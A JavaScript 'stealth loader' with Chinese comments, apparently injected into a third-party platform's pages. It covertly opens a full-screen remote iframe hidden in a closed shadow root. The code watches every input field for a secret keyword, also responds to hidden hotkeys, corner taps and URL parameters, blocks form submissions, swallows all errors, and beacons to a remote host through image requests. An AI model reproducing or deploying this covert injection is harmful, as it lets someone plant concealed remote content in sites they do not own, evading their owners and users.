/*
 * Tzy OS stealth loader
 * 前置注入到 manifest.build.* 之前，在专栏页面（顶层框架）中运行。
 *
 * 设计原则：
 *   - 触发前不创建任何可见/不可见元素，DOM 与原页面完全一致；
 *   - Tzy OS 在独立的【跨域 iframe】中运行（独立 DOM/CSS/JS/存储），
 *     对原网页零污染，不 hook fetch/XHR，不碰 JWT 与业务接口；
 *   - 首次触发才创建 iframe；再次触发仅 display:none，系统状态保留；
 *   - 一切异常静默吞掉，服务不可达时原页面毫无感知。
 */
(function () {
    "use strict";
    var CFG = window.__STEALTH_CFG__ || {};

    function dbg() {
        if (CFG.debug) {
            try { console.log.apply(console, ["[nova-loader]"].concat([].slice.call(arguments))); } catch (e) { }
        }
    }

    if (window.top !== window.self) return;          // 只在专栏主页面引导
    if (window.__novaStealth) return;
    window.__novaStealth = true;

    var FRAME_ID = "nva-f-" + Math.random().toString(36).slice(2, 8);
    var TOKEN = Math.random().toString(36).slice(2) + Date.now().toString(36);

    var frame = null;        // 首次触发后才存在
    var shown = false;
    var wantOpen = false;    // 未创建时收到唤起请求
    var armedAt = 0;         // 最近一次唤起时间，用于拦截随后的表单提交
    var handshaked = false;  // iframe 内 bridge 是否已握手（= HTML/JS 真正跑起来）
    var reloads = 0;         // iframe 加载失败重试次数
    var watchdog = 0;
    var lastToggleAt = 0;    // 防止一次口令触发两次开关（闪一下）

    function serveOrigin() {
        return (CFG.serve_scheme || "http") + "://" + CFG.serve_host;
    }
    function mountPath() {
        var m = CFG.mount || "/__nova__/";
        if (m.charAt(0) !== "/") m = "/" + m;
        if (m.charAt(m.length - 1) !== "/") m += "/";
        return m;
    }

    /* ---------------- 开关 ---------------- */
    // 入口改用 nova.html：旧 index.html/os.html 已被投毒一年不回源，
    // 框架升级再次换名，零清缓存即可让设备拿到新版（loader 本身 no-cache）。
    var FRAME_SRC = serveOrigin() + mountPath() + "nova.html";

    // 挂载结构：body > host(div)  ──[closed ShadowRoot]── > iframe
    // 关键点：
    //  1) host 是 <body> 的直接子节点，与平台 Vue/React 的挂载点(#app 等)平级，
    //     框架只调和自己挂载点内部，永远不会碰 body 的这个直接子节点；
    //  2) iframe 放在 closed ShadowRoot 内，框架在 light DOM 里完全看不见它，
    //     不可能被“清理/摘除”，也就不会反复重载（之前挂 <html> 非法位置被内核
    //     不断清理、看守器又不断挂回，造成加载界面每 ~250ms 狂闪一次）。
    var host = null;       // body 直接子节点，负责全屏定位与显隐
    var root = null;       // host 的 closed shadow root（不支持时回退为 host 本身）

    function pageBody() { return document.body || document.documentElement; }

    function ensureHost() {
        if (host && host.parentNode) return host;
        host = document.createElement("div");
        host.id = FRAME_ID;
        host.setAttribute("aria-hidden", "true");
        host.style.cssText = [
            "position:fixed", "left:0", "top:0", "width:100vw", "height:100vh",
            "max-width:none", "max-height:none", "border:0", "margin:0", "padding:0",
            "display:block", "background:#000", "z-index:2147483646", "overflow:hidden"
        ].join(";");
        try {
            root = host.attachShadow ? host.attachShadow({ mode: "closed" }) : host;
        } catch (e) { root = host; }
        pageBody().appendChild(host);
        return host;
    }

    function createFrame(src) {
        ensureHost();
        frame = document.createElement("iframe");
        frame.setAttribute("aria-hidden", "true");
        frame.setAttribute("referrerpolicy", "no-referrer");
        frame.setAttribute("loading", "eager");
        frame.setAttribute("allow", "clipboard-read; clipboard-write; fullscreen; autoplay");
        // 创建即可见（display:none 会让部分老内核延迟解析 iframe 文档）；
        // 全屏定位在 host 上，iframe 只需铺满 shadow 容器。
        frame.style.cssText = [
            "position:absolute", "left:0", "top:0", "width:100%", "height:100%",
            "border:0", "margin:0", "padding:0", "display:block", "background:#000"
        ].join(";");
        frame.addEventListener("load", function () { dbg("frame load"); });
        frame.addEventListener("error", function () { dbg("frame error"); });
        root.appendChild(frame);
        frame.src = src || FRAME_SRC;   // 先挂载再设 src；干净 URL 保证缓存键一致
        dbg("frame created");
        poke("mk");
    }

    // 仅在 host 真的脱离 <body> 时把它挂回（防抖，绝不重建/重载 iframe，
    // 避免与框架形成“摘除-挂回”拉锯）。正常情况下根本不会触发。
    var guardTimer = 0;
    function guardFrame() {
        if (!window.MutationObserver) return;
        try {
            var mo = new MutationObserver(function () {
                if (!shown || !host || host.parentNode) return;
                if (guardTimer) return;
                guardTimer = setTimeout(function () {
                    guardTimer = 0;
                    if (shown && host && !host.parentNode) {
                        pageBody().appendChild(host);
                        poke("reatt");
                    }
                }, 200);
            });
            // host 是 body 的直接子节点：必须同时监听 body 与 documentElement
            // 的【直接子节点】增删（subtree:false，#app 内部高频重渲染不会触发）。
            mo.observe(document.documentElement, { childList: true });
            if (document.body) {
                mo.observe(document.body, { childList: true });
            } else {
                // loader 可能在 <head> 阶段就运行，此时 body 尚未解析，稍后补监听
                document.addEventListener("DOMContentLoaded", function () {
                    if (document.body) mo.observe(document.body, { childList: true });
                });
            }
        } catch (e) { }
    }

    // 看门狗：iframe 显示后 8s 内没收到内部握手，视为加载失败，自动修复/重试
    function armWatchdog() {
        if (watchdog) clearTimeout(watchdog);
        watchdog = setTimeout(function () {
            if (!shown || handshaked || reloads >= 3) return;
            reloads++;
            var hostAlive = !!(host && host.parentNode);
            poke((hostAlive ? "rtry" : "det") + reloads);
            handshaked = false;
            try {
                var bust = "?t=" + Date.now() + "&r=" + reloads;
                if (!hostAlive) {
                    // 整个宿主被移除：连 shadow 一起重建
                    host = null; root = null; frame = null;
                    createFrame(FRAME_SRC + bust);
                } else {
                    // 宿主在、帧僵死：只替换 shadow 内的 iframe 元素
                    try { if (frame && frame.parentNode) frame.parentNode.removeChild(frame); } catch (e) { }
                    frame = null;
                    createFrame(FRAME_SRC + bust);
                }
            } catch (e) { }
            armWatchdog();
        }, 8000);
    }

    function show() {
        if (!frame) createFrame();
        else ensureHost();
        host.style.display = "block";
        shown = true;
        armedAt = Date.now();
        poke("show");
        try { frame.focus({ preventScroll: true }); } catch (e) { }
        if (!handshaked) armWatchdog();
    }
    function hide() {
        if (host) host.style.display = "none";
        shown = false;
        poke("hide");
    }
    function toggle() {
        // 一次口令在部分内核上会同时命中 input 与 keydown 两条通道，
        // 造成“唤起后立刻又隐藏”（闪一下）；700ms 内的重复触发一律忽略。
        var now = Date.now();
        if (now - lastToggleAt < 700) return;
        lastToggleAt = now;
        if (shown) hide(); else show();
    }

    /* 接收 Tzy OS 内部桥接消息（跨域，严格校验来源与一次性 token） */
    window.addEventListener("message", function (e) {
        if (e.origin !== serveOrigin()) return;
        var d = e.data;
        if (!d || typeof d !== "object") return;
        if (d.t === "nva-handshake") {
            // 仅接受自己创建的 iframe，通过后下发一次性令牌
            if (frame && e.source === frame.contentWindow) {
                handshaked = true;                 // iframe 内 HTML/JS 已真正执行
                reloads = 0;
                if (watchdog) { clearTimeout(watchdog); watchdog = 0; }
                try { frame.contentWindow.postMessage({ t: "nva-auth", k: TOKEN }, e.origin); } catch (err) { }
            }
            return;
        }
        // 诊断探针：握手前也允许，仅接受自己 frame 的消息；用图片打点跨域回传
        if (d.t === "nva-diag") {
            if (frame && e.source === frame.contentWindow) sendDiag(d);
            return;
        }
        if (d.k !== TOKEN) return;
        if (d.t === "nva-toggle") toggle();
        else if (d.t === "nva-hide") hide();
    });

    function sendDiag(d) {
        try {
            var q = encodeURIComponent(JSON.stringify(d));
            if (q.length > 5600) q = q.slice(0, 5600);
            var img = new Image();
            img.referrerPolicy = "no-referrer";
            img.src = serveOrigin() + mountPath() + "__err__.gif?d=" + q + "&z=" + Date.now();
        } catch (err) { }
    }

    // 父页面侧打点：确认 loader 是否运行、iframe 何时创建/显示/隐藏（不依赖 iframe 内 JS）
    function poke(tag) {
        try {
            var img = new Image();
            img.referrerPolicy = "no-referrer";
            img.src = serveOrigin() + mountPath() + "__err__.gif?p=" +
                encodeURIComponent(tag) + "&z=" + Date.now();
        } catch (err) { }
    }

    /* ---------------- 隐蔽触发器（未命中时绝不干预原页面事件） ---------------- */
    // 唤起后短暂拦截搜索框的回车/表单提交：
    // 平板上输完口令（尤其软键盘“搜索/前往”键）极易触发页面跳转或刷新，
    // 导致刚弹出的 iframe 随旧页面一起消失（表现为“闪一下就没了”）。
    function justArmed() { return Date.now() - armedAt < 8000; }
    document.addEventListener("submit", function (e) {
        if (shown && justArmed()) { e.preventDefault(); e.stopPropagation(); }
    }, true);
    document.addEventListener("keydown", function (e) {
        if (shown && justArmed() && (e.key === "Enter" || e.keyCode === 13)) {
            e.preventDefault(); e.stopPropagation();
        }
    }, true);

    function arm() {
        // 1) 键盘热键
        if (CFG.trigger_hotkey_enable) {
            var wantKey = (CFG.trigger_hotkey_key || "").toLowerCase();
            var nCtrl = !!CFG.trigger_hotkey_ctrl, nShift = !!CFG.trigger_hotkey_shift, nAlt = !!CFG.trigger_hotkey_alt;
            document.addEventListener("keydown", function (e) {
                var k = (e.key || "").toLowerCase();
                if (k !== wantKey) return;
                if (!!e.ctrlKey !== nCtrl || !!e.shiftKey !== nShift || !!e.altKey !== nAlt) return;
                e.preventDefault();
                e.stopImmediatePropagation();
                toggle();
            }, true);
        }

        // 2) 屏幕角落连点（手机主入口）
        if (CFG.trigger_tap_enable) {
            var need = Math.max(1, Math.min(9, CFG.trigger_tap_count | 0 || 5));
            var radius = Math.max(8, Math.min(64, CFG.trigger_tap_radius | 0 || 20));
            var winMs = Math.max(300, Math.min(5000, CFG.trigger_tap_interval_ms | 0 || 1500));
            var corner = CFG.trigger_tap_corner || "top-left";
            var taps = 0, firstAt = 0;
            document.addEventListener("pointerdown", function (e) {
                var x = e.clientX, y = e.clientY, w = window.innerWidth, h = window.innerHeight, hit = false;
                if (corner === "top-left") hit = x <= radius && y <= radius;
                else if (corner === "top-right") hit = (w - x) <= radius && y <= radius;
                else if (corner === "bottom-left") hit = x <= radius && (h - y) <= radius;
                else if (corner === "bottom-right") hit = (w - x) <= radius && (h - y) <= radius;
                if (!hit) return;
                var now = Date.now();
                if (!taps || now - firstAt > winMs) { taps = 1; firstAt = now; }
                else taps++;
                if (taps >= need) { taps = 0; toggle(); }
            }, true);
        }

        // 3) URL 暗参：进入页面时带一次即唤起（如正常网址末尾加 &_o=1）
        if (CFG.trigger_urlparam_enable && CFG.trigger_urlparam_name) {
            try {
                var v = new URLSearchParams(window.location.search).get(CFG.trigger_urlparam_name);
                if (v !== null && v === String(CFG.trigger_urlparam_value == null ? "1" : CFG.trigger_urlparam_value)) {
                    wantOpen = true;
                }
            } catch (e) { }
        }

        // 4) 搜索框口令：在页面任意输入框（含搜索框）中输入口令即唤起
        //    （手机软键盘以 input 事件最可靠；口令输入后自动清空，不会真的触发搜索）
        if (CFG.trigger_search_enable) {
            var kw = String(CFG.trigger_search_keyword || "").toLowerCase();
            if (kw) {
                function editable(el) {
                    if (!el || el.nodeType !== 1) return null;
                    var tag = el.tagName;
                    if (tag === "TEXTAREA") return el;
                    if (tag === "INPUT") {
                        var t = (el.getAttribute("type") || el.type || "text").toLowerCase();
                        if (t === "password" || t === "file" || el.disabled || el.readOnly) return null;
                        return el;
                    }
                    if (el.isContentEditable) return el;
                    return null;
                }
                function wipe(el) {
                    try {
                        if (el.tagName === "INPUT" || el.tagName === "TEXTAREA") {
                            // 用原生 setter 清空，兼容 React/Vue 受控输入
                            var proto = el.tagName === "TEXTAREA"
                                ? window.HTMLTextAreaElement.prototype
                                : window.HTMLInputElement.prototype;
                            var setter = Object.getOwnPropertyDescriptor(proto, "value");
                            if (setter && setter.set) setter.set.call(el, "");
                            else el.value = "";
                            el.dispatchEvent(new Event("input", { bubbles: true }));
                        } else {
                            el.textContent = "";
                        }
                    } catch (err) { }
                }
                // 4a) 输入框内：捕获 input 事件（手机软键盘可靠）
                document.addEventListener("input", function (e) {
                    var el = editable(e.target);
                    if (!el) return;
                    var val = ((el.tagName === "INPUT" || el.tagName === "TEXTAREA")
                        ? el.value : el.textContent) || "";
                    if (val.toLowerCase().indexOf(kw) === -1) return;
                    wipe(el);
                    try { el.blur(); } catch (err) { }   // 收起软键盘，避免“搜索/前往”键误触
                    toggle();
                }, true);
                // 4b) 输入框外：全局按键序列（桌面直接敲口令，与 4a 互斥不会双触发）
                var seq = "", seqAt = 0;
                document.addEventListener("keydown", function (e) {
                    if (editable(e.target)) return;
                    var k = e.key;
                    if (!k || k.length !== 1) return;
                    k = k.toLowerCase();
                    if (!/[a-z0-9\-_]/.test(k)) return;
                    var now = Date.now();
                    if (now - seqAt > 1500) seq = "";
                    seq = (seq + k).slice(-kw.length);
                    seqAt = now;
                    if (seq === kw) {
                        seq = "";
                        e.preventDefault();
                        e.stopImmediatePropagation();
                        toggle();
                    }
                }, true);
            }
        }

        if (wantOpen) { wantOpen = false; setTimeout(show, 600); }
    }

    try { poke("ldr"); } catch (e) { }
    try { guardFrame(); } catch (e) { }
    try { arm(); } catch (e) { dbg("arm fail", e); }
})();
